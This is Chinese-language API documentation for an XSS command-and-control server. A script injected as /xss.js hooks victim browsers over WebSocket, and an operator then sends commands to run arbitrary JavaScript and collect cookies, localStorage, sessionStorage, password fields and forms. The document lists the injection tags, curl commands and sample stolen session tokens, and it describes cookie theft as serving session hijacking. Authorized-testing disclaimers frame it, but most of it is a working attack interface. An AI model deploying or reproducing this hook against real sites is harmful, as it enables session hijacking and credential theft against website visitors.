# 🎯 XSS 安全测试 API 文档

## ⚠️ 安全声明
**此API仅用于授权安全测试目的。请负责任地使用，仅在您拥有或有明确许可测试的系统上使用。**

## 🌐 基础信息

### 服务器地址
```
http://localhost:8088
```

### 支持的功能
- ✅ WebSocket 实时通信
- ✅ RESTful API 接口
- ✅ 跨域资源共享 (CORS)
- ✅ 客户端角色管理
- ✅ 命令广播和定向发送

---

## 🔐 WebSocket 连接

### 建立 WebSocket 连接
```
ws://localhost:8088/ws?role={role}&id={client_id}
```

**查询参数:**
- `role` (必需, string): 客户端角色
  - `"victim"` - 靶机角色，接收并执行命令
  - `"attacker"` - 攻击者角色，发送命令
- `id` (可选, string): 自定义客户端ID，不提供时自动生成

**连接示例:**
```javascript
// 靶机连接
const victimWs = new WebSocket('ws://localhost:8088/ws?role=victim&id=target_001');

// 攻击者连接  
const attackerWs = new WebSocket('ws://localhost:8088/ws?role=attacker&id=hacker_001');
```

---

## 👥 客户端管理 API

### 1. 获取所有连接的客户端
```http
GET /api/clients
```

**功能:** 获取当前所有连接的客户端列表

**响应示例:**
```json
{
  "status": "success",
  "message": "获取靶机列表成功",
  "data": [
    {
      "id": "victim_abc123",
      "role": "victim",
      "connect_time": "2025-01-20T10:30:00Z",
      "last_seen": "2025-01-20T10:35:00Z",
      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
      "ip": "192.168.1.100",
      "status": "online"
    }
  ],
  "timestamp": "2025-01-20T10:35:00Z"
}
```

### 2. 获取特定客户端信息
```http
GET /api/clients/{client_id}
```

**路径参数:**
- `client_id` (必需, string): 客户端ID

**响应示例:**
```json
{
  "status": "success",
  "message": "获取靶机信息成功",
  "data": {
    "id": "victim_abc123",
    "role": "victim",
    "connect_time": "2025-01-20T10:30:00Z",
    "last_seen": "2025-01-20T10:35:00Z",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "ip": "192.168.1.100",
    "status": "online"
  },
  "timestamp": "2025-01-20T10:35:00Z"
}
```

**错误响应:**
```json
{
  "status": "error",
  "message": "靶机不存在",
  "timestamp": "2025-01-20T10:35:00Z"
}
```

---

## 💻 命令执行 API

### 1. 向所有靶机广播命令
```http
POST /api/commands
Content-Type: application/json
```

**功能:** 向所有连接的靶机发送命令

**请求体:**
```json
{
  "command": "cookie",
  "args": {
    "additional_param": "value"
  }
}
```

**请求参数:**
- `command` (必需, string): 要执行的命令类型
- `args` (可选, object): 命令的附加参数

**响应示例:**
```json
{
  "status": "success", 
  "message": "命令执行完成，收到 3 个结果",
  "data": {
    "command": "cookie",
    "target_id": "",
    "args": {
      "additional_param": "value"
    },
    "results": [
      {
        "client_id": "victim_abc123",
        "command": "cookie",
        "result": "session_id=abc123; auth=xyz789",
        "url": "https://target-site.com",
        "timestamp": 1640995200
      },
      {
        "client_id": "victim_def456", 
        "command": "cookie",
        "result": "user_token=token123; csrf=csrf456",
        "url": "https://another-site.com",
        "timestamp": 1640995201
      }
    ],
    "count": 3
  },
  "timestamp": "2025-01-20T10:35:00Z"
}
```

### 2. 向指定客户端发送命令
```http
POST /api/clients/{client_id}/commands
Content-Type: application/json
```

**功能:** 向指定的客户端发送命令

**路径参数:**
- `client_id` (必需, string): 目标客户端ID

**请求体:**
```json
{
  "command": "eval",
  "args": {
    "code": "alert('XSS Test')"
  }
}
```

**响应示例:**
```json
{
  "status": "success",
  "message": "命令执行完成，收到 1 个结果", 
  "data": {
    "command": "eval",
    "target_id": "victim_abc123",
    "args": {
      "code": "alert('XSS Test')"
    },
    "results": [
      {
        "client_id": "victim_abc123",
        "command": "eval",
        "result": "undefined",
        "url": "https://target-site.com",
        "timestamp": 1640995200
      }
    ],
    "count": 1
  },
  "timestamp": "2025-01-20T10:35:00Z"
}
```

### 3. 使用目标ID发送命令（替代方法）
```http
POST /api/commands
Content-Type: application/json
```

**请求体:**
```json
{
  "target_id": "victim_abc123",
  "command": "location",
  "args": {}
}
```

**说明:** 当提供 `target_id` 时，命令将仅发送给指定客户端而非广播

## ⚡ API 执行机制

### 🔄 同步执行
- API会等待靶机执行完命令并返回结果（默认超时10秒）
- 响应中的 `results` 字段包含所有靶机的执行结果
- 每个结果包含客户端ID、命令、结果数据、来源URL和时间戳

### 📊 结果格式
```json
{
  "client_id": "victim_abc123",    // 执行命令的靶机ID
  "command": "cookie",             // 执行的命令
  "result": "session_id=abc123",   // 命令执行结果
  "url": "https://target.com",     // 靶机所在页面URL  
  "timestamp": 1640995200          // 执行时间戳
}
```

### ⏱️ 超时处理
- 如果在10秒内未收到所有结果，API将返回已收集的结果
- 消息显示为 "命令已发送，但未收到任何结果（可能无客户端在线或超时）"

---

## 🎯 可用命令类型

### 1. 执行 JavaScript 代码
```json
{
  "command": "eval",
  "args": {
    "code": "document.title"
  }
}
```
**功能:** 在目标页面执行任意 JavaScript 代码
**用途:** 自定义操作、高级信息收集

### 2. 获取 Cookie
```json
{
  "command": "cookie"
}
```
**功能:** 获取当前页面的所有 Cookie
**用途:** 会话劫持、身份认证信息收集

### 3. 获取位置信息
```json
{
  "command": "location"
}
```
**功能:** 获取当前页面的 URL 和位置信息
**用途:** 页面识别、导航信息收集

### 4. 获取本地存储
```json
{
  "command": "localStorage"
}
```
**功能:** 获取页面的 localStorage 数据
**用途:** 客户端数据收集

### 5. 获取会话存储
```json
{
  "command": "sessionStorage"
}
```
**功能:** 获取页面的 sessionStorage 数据
**用途:** 会话数据收集

### 6. 获取 DOM 元素
```json
{
  "command": "dom",
  "args": {
    "selector": "input[type=password]"
  }
}
```
**功能:** 根据 CSS 选择器获取 DOM 元素信息
**用途:** 表单信息、敏感元素定位

### 7. 获取表单信息
```json
{
  "command": "forms"
}
```
**功能:** 获取页面所有表单的详细信息
**用途:** 表单数据收集、输入字段分析

### 8. 获取用户代理
```json
{
  "command": "userAgent"
}
```
**功能:** 获取浏览器用户代理字符串
**用途:** 浏览器指纹识别

---

## 📜 载荷 API

### 获取 JavaScript 载荷
```http
GET /xss.js
```

**功能:** 获取用于 XSS 注入的 JavaScript 载荷代码

**响应:** 返回自动连接到服务器的 JavaScript 代码

**载荷功能:**
- 🔗 自动建立 WebSocket 连接
- 🎭 识别为靶机角色 (victim)
- 💓 定期发送心跳保持连接
- 📡 接收并执行来自服务器的命令

**使用方式:**
```html
<!-- 直接注入 -->
<script src="http://localhost:8088/xss.js"></script>

<!-- 或通过 JavaScript -->
<script>
document.write('<script src="http://localhost:8088/xss.js"><\/script>');
</script>
```

---

## 🔌 WebSocket 消息格式

### 消息结构
```json
{
  "type": "command|result|heartbeat|welcome",
  "from": "client_id",
  "to": "target_id",
  "data": {},
  "timestamp": 1642680000
}
```

**字段说明:**
- `type` (string): 消息类型
  - `"command"` - 命令消息
  - `"result"` - 结果消息
  - `"heartbeat"` - 心跳消息
  - `"welcome"` - 欢迎消息
- `from` (string): 发送方客户端ID
- `to` (string): 目标客户端ID (可选)
- `data` (object): 消息数据
- `timestamp` (number): Unix时间戳

### 命令消息 (攻击者 → 靶机)
```json
{
  "type": "command",
  "from": "attacker_123",
  "to": "victim_456",
  "data": {
    "command": "cookie",
    "args": {}
  },
  "timestamp": 1642680000
}
```

### 结果消息 (靶机 → 攻击者)
```json
{
  "type": "result",
  "from": "victim_456",
  "data": {
    "command": "cookie",
    "result": "session_id=abc123; token=xyz789",
    "url": "https://target-site.com",
    "timestamp": 1642680000
  },
  "timestamp": 1642680000
}
```

### 心跳消息
```json
{
  "type": "heartbeat",
  "data": {
    "status": "alive"
  },
  "timestamp": 1642680000
}
```

---

## 🚨 错误响应

### 错误格式
```json
{
  "status": "error",
  "message": "错误描述",
  "timestamp": "2025-01-20T10:35:00Z",
  "error": "详细错误信息"
}
```

### 常见错误代码
- `400` - 请求错误 (无效JSON、缺少参数)
- `404` - 未找到 (客户端不存在)
- `500` - 服务器内部错误

---

## 🔍 使用示例

### 示例 1: 获取所有连接的客户端
```bash
curl -X GET "http://localhost:8088/api/clients"
```

### 示例 2: 向所有靶机发送 Cookie 提取命令
```bash
curl -X POST "http://localhost:8088/api/commands" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "cookie"
  }'

# 响应示例:
{
  "status": "success",
  "message": "命令执行完成，收到 2 个结果",
  "data": {
    "command": "cookie",
    "results": [
      {
        "client_id": "victim_123",
        "command": "cookie", 
        "result": "session_id=abc123; auth_token=xyz789",
        "url": "https://site1.com",
        "timestamp": 1640995200
      },
      {
        "client_id": "victim_456", 
        "command": "cookie",
        "result": "user_id=789; csrf_token=def456", 
        "url": "https://site2.com",
        "timestamp": 1640995201
      }
    ],
    "count": 2
  }
}
```

### 示例 3: 在指定靶机执行 JavaScript
```bash
curl -X POST "http://localhost:8088/api/clients/victim_123/commands" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "eval",
    "args": {
      "code": "document.title"
    }
  }'

# 响应示例:
{
  "status": "success", 
  "message": "命令执行完成，收到 1 个结果",
  "data": {
    "command": "eval",
    "target_id": "victim_123",
    "results": [
      {
        "client_id": "victim_123",
        "command": "eval",
        "result": "管理后台 - 用户管理", 
        "url": "https://admin.target.com/users",
        "timestamp": 1640995200
      }
    ],
    "count": 1
  }
}
```

### 示例 4: 从所有靶机获取表单信息
```bash
curl -X POST "http://localhost:8088/api/commands" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "forms"
  }'
```

### 示例 5: 获取特定客户端信息
```bash
curl -X GET "http://localhost:8088/api/clients/victim_123"
```

### 示例 6: 获取本地存储数据
```bash
curl -X POST "http://localhost:8088/api/commands" \
  -H "Content-Type: application/json" \
  -d '{
    "command": "localStorage"
  }'
```

---

## ⚖️ 法律和道德使用

**重要提醒:** 此工具设计用于:
- ✅ 授权渗透测试
- ✅ 自有系统的安全研究
- ✅ 教育目的
- ✅ 经过授权的漏洞评估

**禁止用于:**
- ❌ 未授权访问系统
- ❌ 恶意攻击
- ❌ 非法活动

在测试任何系统之前，请务必确保您拥有适当的授权。

---

## 📞 技术支持

如有问题或需要帮助，请参考：
- 📖 [README.md](../README.md) - 项目概述和快速开始
- 🏗️ 源代码注释 - 详细的实现说明
- 🔧 日志输出 - 运行时调试信息